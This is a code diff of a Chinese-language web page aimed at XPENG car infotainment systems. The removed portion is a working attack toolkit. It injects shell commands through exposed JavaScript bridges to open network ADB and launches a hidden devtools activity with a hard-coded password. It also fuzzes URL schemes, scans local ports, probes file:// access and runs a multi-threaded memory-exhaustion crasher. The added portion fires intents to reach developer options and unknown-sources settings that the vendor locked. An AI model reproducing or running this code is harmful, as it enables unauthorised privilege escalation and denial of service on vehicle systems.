@@ -3,435 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>XPENG SILENT-OMEGA v20.0</title>
+    <title>XPENG SETTINGS OVERLORD</title>
     <style>
-        /* === 全局样式 === */
-        :root {
-            --bg: #000000;
-            --panel: #111111;
-            --border: #333;
-            --green: #00ff41; 
-            --red: #ff3333; 
-            --yellow: #ffcc00; 
-            --blue: #00ccff;
-            --text: #eeeeee;
-            --font: 'Consolas', 'Monaco', monospace;
-        }
-
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #000; color: #fff; font-family: sans-serif; padding: 20px; padding-bottom: 200px; }
+        h1 { color: #00e5ff; border-bottom: 2px solid #00e5ff; padding-bottom: 10px; }
         
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: var(--font);
-            margin: 0; padding: 0;
-            height: 100vh;
-            display: flex; flex-direction: column;
-            overflow: hidden;
-        }
-
-        /* === 顶部日志终端 (固定不许动，占比 40%) === */
-        #terminal-container {
-            height: 40%;
-            background: #000;
-            border-bottom: 2px solid var(--green);
-            display: flex; flex-direction: column;
-            z-index: 10;
-            box-shadow: 0 5px 20px rgba(0, 255, 65, 0.1);
-        }
-
-        #term-header {
-            padding: 8px 15px; background: #0a0a0a; border-bottom: 1px solid #222;
-            font-size: 11px; color: #666; display: flex; justify-content: space-between; align-items: center;
-        }
-
-        #console {
-            flex: 1; padding: 10px; overflow-y: scroll;
-            font-size: 11px; line-height: 1.4; scroll-behavior: auto;
-        }
-
-        /* 日志条目 */
-        .log-entry { margin-bottom: 3px; word-break: break-all; border-bottom: 1px solid #080808; }
-        .ts { color: #444; margin-right: 8px; font-size: 10px; }
-        .c-info { color: #888; }
-        .c-ok { color: var(--green); }
-        .c-err { color: var(--red); font-weight: bold; }
-        .c-warn { color: var(--yellow); }
-        .c-inj { color: var(--blue); }
-
-        /* === 底部操作区 (滚动，底部留白) === */
-        #controls-container {
-            flex: 1; overflow-y: auto; padding: 15px;
-            background: var(--panel);
-            /* 关键：底部巨大缓冲，防止车机导航栏遮挡 */
-            padding-bottom: 200px; 
-        }
-
-        /* 模块卡片 */
-        .card {
-            border: 1px solid var(--border); background: #161616;
-            border-radius: 6px; margin-bottom: 15px; overflow: hidden;
-        }
-        .card-head {
-            padding: 10px; background: #202020; border-bottom: 1px solid #333;
-            font-size: 12px; font-weight: bold; color: #ccc;
-            display: flex; align-items: center; gap: 8px;
-        }
-        .card-body { padding: 10px; display: grid; gap: 8px; }
-
-        /* 按钮系统 */
+        .btn-grid { display: grid; gap: 15px; }
+        
         button {
-            width: 100%; padding: 15px; /* 大触控区 */
-            background: #252525; border: 1px solid #444; color: #ccc;
-            font-family: inherit; font-size: 12px; text-align: left;
-            border-radius: 4px; cursor: pointer; position: relative;
-            transition: all 0.1s;
+            width: 100%; padding: 20px; 
+            background: #222; border: 1px solid #444; color: #eee;
+            font-size: 16px; font-weight: bold; text-align: left;
+            border-radius: 8px; position: relative;
         }
-        button:active { transform: scale(0.98); background: #333; }
+        button:active { background: #444; transform: scale(0.98); }
         
-        .btn-auto { border-left: 4px solid var(--red); background: rgba(255,0,0,0.1); color:#fff; font-weight:bold; }
-        .btn-inj { border-left: 4px solid var(--green); }
-        .btn-waf { border-left: 4px solid var(--yellow); }
-        .btn-intent { border-left: 4px solid var(--blue); }
-        .btn-crash { border-left: 4px solid #fff; color: var(--red); }
-
-        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-        #progress { height: 3px; background: var(--green); width: 0%; transition: width 0.2s; }
+        .b-main { border-left: 5px solid #00ff00; }
+        .b-sub { border-left: 5px solid #ffcc00; }
+        .b-dev { border-left: 5px solid #ff0055; }
         
-        /* 状态监控 */
-        .stat-row { display: flex; justify-content: space-between; font-size: 10px; color: #666; margin-top: 5px; }
+        .desc { font-size: 10px; color: #888; margin-top: 5px; font-weight: normal; }
     </style>
 </head>
 <body>
 
-<!-- 顶部日志 -->
-<div id="terminal-container">
-    <div id="term-header">
-        <span>SILENT-OMEGA TERMINAL</span>
-        <div style="display:flex; gap:10px;">
-            <span id="mem-stat" style="color:var(--red)">MEM: 0MB</span>
-            <span onclick="Logger.clear()" style="cursor:pointer; color:#fff">[CLEAR]</span>
-        </div>
-    </div>
-    <div id="progress"></div>
-    <div id="console">
-        <div class="log-entry"><span class="c-info">System Ready. No popups mode enabled.</span></div>
-    </div>
-</div>
+<h1>⚙️ SETTINGS LAUNCHER</h1>
+<p style="color:#aaa; font-size:12px;">点击下方按钮。如果弹出"选择应用"，请尝试寻找类似"设置"或"安卓系统"的图标。</p>
 
-<!-- 底部操作 -->
-<div id="controls-container">
+<div class="btn-grid">
 
-    <!-- 0. 全自动 -->
-    <div class="card" style="border-color: var(--red);">
-        <div class="card-head"><span class="dot" style="background:var(--red)"></span> 🔥 AUTO-SIEGE (静默攻城)</div>
-        <div class="card-body">
-            <button class="btn-auto" onclick="Orchestrator.runAll()">
-                ⚡️ 启动全流程 (Env -> Inject -> Intent -> Port)<br>
-                <span style="font-size:10px; opacity:0.7; font-weight:normal;">不会弹出任何提示框，请关注上方日志</span>
-            </button>
-        </div>
-    </div>
+    <!-- 1. 核心目标：开发者选项 -->
+    <button class="b-dev" onclick="launch('android.settings.DEVELOPMENT_SETTINGS')">
+        🔨 开发者选项 (直接入口)
+        <div class="desc">Target: Development Settings</div>
+    </button>
 
-    <!-- 1. JS 注入 -->
-    <div class="card">
-        <div class="card-head"><span class="dot" style="background:var(--green)"></span> 1. JS Bridge (提权核心)</div>
-        <div class="card-body">
-            <button class="btn-inj" onclick="Mods.scanBridges()">👁 扫描接口 (自动过滤非法调用)</button>
-            <button class="btn-inj" onclick="Mods.injectMatrix('ADB')">🔓 暴力注入 ADB (147种变体)</button>
-            <button class="btn-inj" onclick="Mods.injectMatrix('UI')">🖥 暴力注入 UI 拉起</button>
-        </div>
-    </div>
+    <!-- 2. 通用设置首页 -->
+    <button class="b-main" onclick="launch('android.settings.SETTINGS')">
+        ⚙️ 原生设置首页
+        <div class="desc">Target: Settings Main</div>
+    </button>
 
-    <!-- 2. WAF 绕过 -->
-    <div class="card">
-        <div class="card-head"><span class="dot" style="background:var(--yellow)"></span> 2. 维保 Payload 生成</div>
-        <div class="card-body">
-            <button class="btn-waf" onclick="Mods.copyPayload('PIPE')">📝 复制到剪贴板: 管道符版 ( | )</button>
-            <button class="btn-waf" onclick="Mods.copyPayload('NEWLINE')">📝 复制到剪贴板: 换行符版 ( \n )</button>
-            <button class="btn-waf" onclick="Mods.copyPayload('AMP')">📝 复制到剪贴板: 逻辑符版 ( || )</button>
-        </div>
-    </div>
+    <!-- 3. 极大概率漏网的子菜单 -->
+    <button class="b-sub" onclick="launch('android.settings.APPLICATION_SETTINGS')">
+        📦 应用管理
+        <div class="desc">很多车机忘记屏蔽这个，进去后点“全部应用”->找到设置->打开</div>
+    </button>
 
-    <!-- 3. Intent 提权 -->
-    <div class="card">
-        <div class="card-head"><span class="dot" style="background:var(--blue)"></span> 3. Intent (点击触发)</div>
-        <div class="card-body">
-            <button class="btn-intent" onclick="Mods.launchIntent('mixed')">🚀 混合 Flag (0x1199A1E6)</button>
-            <button class="btn-intent" onclick="Mods.launchIntent('extra')">📦 Extra 参数传递</button>
-            <button class="btn-intent" onclick="Mods.launchReflect()">🪞 反射 Intent</button>
-            <button class="btn-intent" onclick="Mods.dialerFuzz()">📞 拨号盘工程码</button>
-            <button class="btn-intent" onclick="Mods.schemeFuzz()">💣 Scheme 协议爆破</button>
-        </div>
-    </div>
+    <button class="b-sub" onclick="launch('android.settings.WIFI_SETTINGS')">
+        📶 WiFi 设置
+        <div class="desc">原生 WiFi 界面，通常包含高级选项</div>
+    </button>
+    
+    <button class="b-sub" onclick="launch('android.settings.BLUETOOTH_SETTINGS')">
+        🔵 蓝牙设置
+        <div class="desc">原生蓝牙界面</div>
+    </button>
 
-    <!-- 4. 核弹级 Fuzzer -->
-    <div class="card">
-        <div class="card-head"><span class="dot" style="background:#fff"></span> 4. 内存核弹 (多线程)</div>
-        <div class="card-body">
-            <button class="btn-crash" style="background:#200" onclick="Mods.doomsday()">
-                ☠️ 启动 DOOMSDAY (16GB RAM Killer)<br>
-                <span style="font-size:10px;">使用 Web Workers 多线程吞噬，直到重启</span>
-            </button>
-            <button class="btn-crash" onclick="Mods.scanPorts()">📡 端口静默扫描 (9222/5050)</button>
-            <button class="btn-crash" onclick="Mods.checkFile()">📂 文件 file:// 越权测试</button>
-        </div>
-    </div>
+    <button class="b-sub" onclick="launch('android.settings.DEVICE_INFO_SETTINGS')">
+        ℹ️ 关于本机 (连点版本号)
+        <div class="desc">进去狂点 Build Number 开启开发者模式</div>
+    </button>
+
+    <button class="b-sub" onclick="launch('android.settings.SECURITY_SETTINGS')">
+        🔒 安全设置 (未知来源)
+        <div class="desc">允许安装未知应用开关</div>
+    </button>
+
+    <!-- 4. 显式调用 (针对 Android 12) -->
+    <button class="b-dev" style="background:#220000" onclick="launchExplicit()">
+        🚀 显式拉起 com.android.settings
+        <div class="desc">直接 Component 调用，不通过 Action 匹配</div>
+    </button>
 
 </div>
 
 <script>
-// ================= CONFIG =================
-const CONFIG = {
-    target: {
-        pkg: "com.xiaopeng.devtools",
-        cls: "com.xiaopeng.devtools.view.usersettings.UserSettingsActivity",
-        flagMixed: 295282278
-    },
-    matrix: {
-        pre: ["ro.product.model", "sys.usb.config", "1", "true", "null", ""],
-        sep: ["|", "\n", "\r", "&", "||", ";", "%0a"],
-        cmds: {
-            ADB: ["setprop service.adb.tcp.port 5050", "setprop ctl.restart adbd"],
-            UI: ["am start -n com.xiaopeng.devtools/.view.usersettings.UserSettingsActivity"]
-        }
+    function launch(action) {
+        // 构造 Action Intent
+        // flag 0x10000000 = NEW_TASK
+        // flag 0x04000000 = CLEAR_TOP (防止多重打开)
+        const uri = `intent:#Intent;action=${action};flags=0x14000000;end`;
+        window.location.href = uri;
     }
-};
 
-// ================= LOGGER (无弹窗版) =================
-const Logger = {
-    el: document.getElementById('console'),
-    log(lv, msg) {
-        const d = document.createElement('div');
-        d.className = 'log-entry';
-        const ts = new Date().toLocaleTimeString();
-        
-        let c = 'c-info';
-        if(lv==='ERR'||lv==='CRASH') c='c-err';
-        if(lv==='OK') c='c-ok';
-        if(lv==='WARN') c='c-warn';
-        if(lv==='INJ') c='c-inj';
-
-        d.innerHTML = `<span class="ts">[${ts}]</span><span class="${c}">[${lv}] ${msg}</span>`;
-        this.el.appendChild(d);
-        this.el.scrollTop = this.el.scrollHeight;
-    },
-    clear() { this.el.innerHTML = ''; }
-};
-
-// ================= MODULES =================
-const Mods = {
-    bridges: [],
-
-    // 1. JS Bridge 扫描 (过滤敏感API)
-    scanBridges: function(silent=false) {
-        if(!silent) Logger.log('INFO', 'Scanning Window...');
-        let t = [];
-        const ban = ['window','document','location','top','chrome','console','navigator','localStorage','sessionStorage','frames','self','parent','history','performance','external','speechSynthesis','styleMedia','crypto','screen','customElements','visualViewport','clientInformation','webkitStorageInfo','trustedTypes','caches','cookieStore','sharedStorage','crossOriginIsolated','documentPictureInPicture','navigation','scheduler'];
-
-        for(let p in window) {
-            if(ban.includes(p) || !isNaN(parseInt(p))) continue;
-            try {
-                let v = window[p];
-                if(typeof v === 'object' && v !== null) t.push({n:p, o:v});
-            } catch(e) {}
-        }
-        
-        ['xp','xiaopeng','car','system','System','Android','bridge','XPBridge','service','debug','Debug','factory'].forEach(k=>{
-            if(window[k] && !t.find(x=>x.n===k)) t.push({n:k, o:window[k]});
-        });
-
-        this.bridges = t;
-        if(!silent) {
-            if(t.length) Logger.log('OK', `Found ${t.length} Bridges: ${t.map(x=>x.n).join(', ')}`);
-            else Logger.log('WARN', 'No bridges found.');
-        }
-        return t;
-    },
-
-    // 2. 矩阵注入 (静默执行)
-    injectMatrix: async function(type) {
-        const br = this.bridges.length ? this.bridges : this.scanBridges(true);
-        if(!br.length) return Logger.log('WARN', 'No bridges available.');
-
-        Logger.log('INJ', `Injecting ${type} Matrix (147 Variants)...`);
-        let count = 0;
-        const cmds = CONFIG.matrix.cmds[type];
-
-        for(let b of br) {
-            for(let m in b.o) {
-                try {
-                    if(typeof b.o[m]!=='function' || ['toString','valueOf'].includes(m)) continue;
-                    
-                    for(let cmd of cmds) {
-                        // 原生
-                        this._fire(b.o[m], cmd);
-                        // 变种
-                        for(let pre of CONFIG.matrix.pre) {
-                            for(let sep of CONFIG.matrix.sep) {
-                                let pl = `${pre}${sep}${cmd}`;
-                                this._fire(b.o[m], pl);
-                                if(type==='ADB' && m.match(/prop/i)) {
-                                    this._fire(b.o[m], pl, "1");
-                                    let parts = cmd.split(' ');
-                                    if(parts.length>=3) this._fire(b.o[m], parts[1], parts[2]);
-                                }
-                                count++;
-                            }
-                        }
-                        if(count % 50 === 0) await new Promise(r=>setTimeout(r,5));
-                    }
-                } catch(e){}
-            }
-        }
-        Logger.log('OK', `Sent ${count} payloads.`);
-    },
-    _fire: function(f,a,b) { try{f(a); if(b)f(a,b); try{f([a])}catch(e){}}catch(e){} },
-
-    // 3. 手动 Payload (写入剪贴板)
-    copyPayload: function(type) {
-        let sep = (type==='PIPE')?'|':(type==='AMP'?'||':'\n');
-        let txt = `ro.product.model${sep}setprop service.adb.tcp.port 5050${sep}setprop ctl.restart adbd`;
-        
-        let el = document.createElement('textarea');
-        el.value = txt; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
-        
-        Logger.log('OK', `Payload [${type}] copied to clipboard.`);
-    },
-
-    // 4. Intent (需手势)
-    launchIntent: function(mode) {
-        Logger.log('INFO', `Launching Intent (${mode})...`);
-        let uri = (mode==='mixed') 
-            ? `intent:#Intent;component=${CONFIG.target.pkg}/${CONFIG.target.cls};flags=${CONFIG.target.flagMixed};end`
-            : `intent:#Intent;component=${CONFIG.target.pkg}/${CONFIG.target.cls};flags=0x10000000;i.code=26846822;i.password=26846822;end`;
-        try { window.location.href = uri; } catch(e) { this._ifr(uri); }
-    },
-    launchReflect: function() {
-        Logger.log('INFO', 'Reflecting Intent...');
-        let inner = encodeURIComponent(`intent:#Intent;component=${CONFIG.target.pkg}/${CONFIG.target.cls};end`);
-        let uri = `intent:#Intent;component=${CONFIG.target.pkg}/.MainActivity;S.nested=${inner};end`;
-        try { window.location.href = uri; } catch(e) { this._ifr(uri); }
-    },
-    dialerFuzz: function() {
-        Logger.log('INFO', 'Dialer launched.');
-        window.location.href = "tel:*%23*%239925%23*%23*";
-    },
-    schemeFuzz: function() {
-        Logger.log('WARN', 'Fuzzing Schemes...');
-        ["xiaopeng://debug","xp_conf://factory","android-app://com.xiaopeng.devtools"].forEach((s,i) => {
-            setTimeout(()=>this._ifr(s), i*500);
-        });
-    },
-    _ifr: function(u) {
-        try{ let f=document.createElement('iframe'); f.src=u; f.style.display='none'; document.body.appendChild(f); setTimeout(()=>f.remove(),2000); }catch(e){}
-    },
-
-    // 5. DOOMSDAY Engine (多线程内存崩坏)
-    doomsday: function() {
-        Logger.log('CRASH', '!!! STARTING DOOMSDAY ENGINE (16GB KILLER) !!!');
-        const workerCode = `
-            self.onmessage = function() {
-                const chunks = [];
-                setInterval(() => {
-                    try {
-                        const b = new ArrayBuffer(10 * 1024 * 1024);
-                        const v = new Uint8Array(b);
-                        for(let k=0; k<v.length; k+=4096) v[k] = 1; // Dirty Page
-                        chunks.push(b);
-                        self.postMessage(chunks.length * 10);
-                    } catch(e) { while(true){} } // CPU spin if OOM
-                }, 50);
-            };
-        `;
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
-        const url = URL.createObjectURL(blob);
-        
-        let totalMem = 0;
-        for(let i=0; i<16; i++) { // 16 Threads
-            const w = new Worker(url);
-            w.postMessage("GO");
-            w.onmessage = (e) => {
-                totalMem += 10; 
-                document.getElementById('mem-stat').innerText = `MEM: ${totalMem}MB`;
-            };
-        }
-        
-        // 同时运行 DOM Storm
-        this.domFuzz();
-    },
-    
-    domFuzz: function() {
-        Logger.log('WARN', 'DOM Storm Active...');
-        const d = document.createElement('div');
-        for(let i=0; i<5000; i++) {
-            let s = document.createElement('div');
-            s.innerText = 'CRASH'.repeat(50);
-            d.appendChild(s);
-        }
-        document.body.appendChild(d);
-    },
-
-    // 6. 环境
-    scanPorts: function() {
-        Logger.log('INFO', 'Scanning Ports...');
-        [9222, 5050, 5555, 8080].forEach(p => {
-            let start = performance.now();
-            let img = new Image();
-            img.onerror = () => {
-                let delta = performance.now() - start;
-                if(delta < 2000) Logger.log('WARN', `Port ${p} RESPONDED (${Math.round(delta)}ms)`);
-            };
-            img.src = `http://127.0.0.1:${p}/favicon.ico?r=${Math.random()}`;
-        });
-    },
-    checkFile: function() {
-        try {
-            let xhr = new XMLHttpRequest();
-            xhr.open('GET', 'file:///system/build.prop', false);
-            xhr.send();
-            Logger.log('ERR', 'CRITICAL: file:// Access ALLOWED!');
-        } catch(e) {
-            Logger.log('OK', 'file:// access blocked (Secure).');
-        }
+    function launchExplicit() {
+        // 尝试直接点名 Settings 的主 Activity
+        const uri = `intent:#Intent;component=com.android.settings/.Settings;flags=0x14000000;end`;
+        window.location.href = uri;
     }
-};
-
-// ================= AUTOMATION =================
-const Orchestrator = {
-    async runAll() {
-        Logger.clear();
-        Logger.log('WARN', '=== AUTO-SIEGE START ===');
-        const bar = document.getElementById('progress');
-        
-        bar.style.width = "10%";
-        Modules.checkFile();
-        Modules.scanPorts();
-        
-        bar.style.width = "30%";
-        await new Promise(r=>setTimeout(r,1000));
-        
-        const b = Modules.scanBridges();
-        if(b.length) {
-            bar.style.width = "50%";
-            await Modules.injectMatrix('ADB');
-            bar.style.width = "70%";
-            await new Promise(r=>setTimeout(r,1000));
-            await Modules.injectMatrix('UI');
-        } else {
-            Logger.log('WARN', 'No bridges found. Skipping injection.');
-        }
-
-        bar.style.width = "90%";
-        // 自动尝试非手势的 fuzz
-        Modules.schemeFuzz();
-        
-        bar.style.width = "100%";
-        Logger.log('OK', '=== AUTO-SIEGE DONE ===');
-        Logger.log('INFO', 'NOTE: Manually click Intent buttons below.');
-        setTimeout(()=>bar.style.width="0%", 2000);
-    }
-};
 </script>
 </body>
 </html>
